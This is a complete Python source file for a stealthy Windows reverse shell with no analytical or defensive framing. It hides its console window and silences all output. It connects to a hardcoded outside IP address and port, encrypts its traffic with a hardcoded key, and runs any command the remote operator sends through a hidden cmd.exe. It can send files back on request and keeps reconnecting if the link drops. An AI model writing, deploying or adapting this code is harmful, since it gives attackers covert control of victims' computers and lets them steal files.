#!/usr/bin/env python3
# silent_reverse_shell.pyw
import socket
import subprocess
import sys
import os
import time
import ctypes
from cryptography.fernet import Fernet

# --- Hide Console Window Completely ---
try:
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    
    # Hide the console window if it exists
    hwnd = kernel32.GetConsoleWindow()
    if hwnd:
        user32.ShowWindow(hwnd, 0)  # SW_HIDE
    
    # Also prevent new console windows from being created
    kernel32.SetErrorMode(0x0001 | 0x0002)  # SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX
    
except:
    pass

# --- AES Configuration ---
AES_KEY = b'jr8sI1WrJqL_5QyUe6j6H8V9g9vPKQO9v8lfdWpzhqk='
cipher_suite = Fernet(AES_KEY)

# Hardcoded Configuration
SERVER_IP = "190.114.242.67"
SERVER_PORT = 9001

# Global session state
current_directory = os.getcwd()

def execute_command(command):
    """Execute command without opening any windows"""
    global current_directory
    
    try:
        # Handle special commands
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            try:
                if not os.path.isabs(new_dir):
                    new_dir = os.path.join(current_directory, new_dir)
                os.chdir(new_dir)
                current_directory = os.getcwd()
                return f"Changed directory to: {current_directory}".encode('utf-8', 'ignore')
            except Exception as e:
                return f"Error changing directory: {e}".encode('utf-8', 'ignore')
        
        elif command.lower() in ['pwd', 'cwd']:
            return f"Current directory: {current_directory}".encode('utf-8', 'ignore')
        
        elif command.lower().startswith('download '):
            file_path = command[9:].strip()
            if not os.path.isabs(file_path):
                file_path = os.path.join(current_directory, file_path)
            
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        file_data = f.read()
                    return b"FILE_DATA:" + file_data
                except Exception as e:
                    return f"Error reading file: {e}".encode('utf-8', 'ignore')
            else:
                return f"File not found: {file_path}".encode('utf-8', 'ignore')
        
        # For Windows commands, we need to use cmd.exe but hide the window
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE
        
        # Use CREATE_NO_WINDOW flag to prevent ANY window creation
        creation_flags = subprocess.CREATE_NO_WINDOW
        
        # Use cmd.exe /c to execute Windows commands but with hidden window
        process = subprocess.Popen(
            ['cmd.exe', '/c', command],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            cwd=current_directory,
            text=False,
            startupinfo=startupinfo,
            creationflags=creation_flags
        )
        
        stdout, stderr = process.communicate()
        output = stdout + stderr
        
        return output
        
    except Exception as e:
        error_msg = f"Error executing command: {e}".encode('utf-8', 'ignore')
        return error_msg

def send_encrypted(sock, data):
    """Encrypts and sends data with length prefix"""
    try:
        if isinstance(data, str):
            data = data.encode('utf-8', 'ignore')
        
        encrypted_data = cipher_suite.encrypt(data)
        length_prefix = len(encrypted_data).to_bytes(4, byteorder='big')
        sock.send(length_prefix + encrypted_data)
        return True
    except Exception:
        return False

def recv_encrypted(sock):
    """Receives and decrypts data with length prefix"""
    try:
        length_data = sock.recv(4)
        if not length_data:
            return None
        
        encrypted_length = int.from_bytes(length_data, byteorder='big')
        
        encrypted_data = b''
        while len(encrypted_data) < encrypted_length:
            chunk = sock.recv(min(4096, encrypted_length - len(encrypted_data)))
            if not chunk:
                break
            encrypted_data += chunk
        
        if len(encrypted_data) != encrypted_length:
            return None
        
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        return decrypted_data
        
    except Exception:
        return None

def connect_to_server():
    """Establish reverse connection"""
    global current_directory
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60)
            
            s.connect((SERVER_IP, SERVER_PORT))
            
            welcome_msg = f"Reverse shell connected!\nCurrent directory: {current_directory}"
            if not send_encrypted(s, welcome_msg):
                s.close()
                time.sleep(5)
                continue
            
            # Main command loop
            while True:
                encrypted_command = recv_encrypted(s)
                if encrypted_command is None:
                    break
                
                try:
                    command = encrypted_command.decode('utf-8', 'ignore').strip()
                except Exception as e:
                    error_msg = f"Error decoding command: {e}"
                    send_encrypted(s, error_msg)
                    continue

                if command.lower() in ['exit', 'quit']:
                    send_encrypted(s, "Closing connection...")
                    break
                
                if not command:
                    send_encrypted(s, "No command received")
                    continue
                
                output = execute_command(command)
                if not send_encrypted(s, output):
                    break
            
            s.close()
            
        except Exception:
            pass
        
        time.sleep(5)

if __name__ == "__main__":
    # Complete silence - redirect all output to null
    null_fd = os.open(os.devnull, os.O_RDWR)
    os.dup2(null_fd, 1)  # stdout
    os.dup2(null_fd, 2)  # stderr
    
    # Run as background process
    try:
        connect_to_server()
    except:
        sys.exit(0)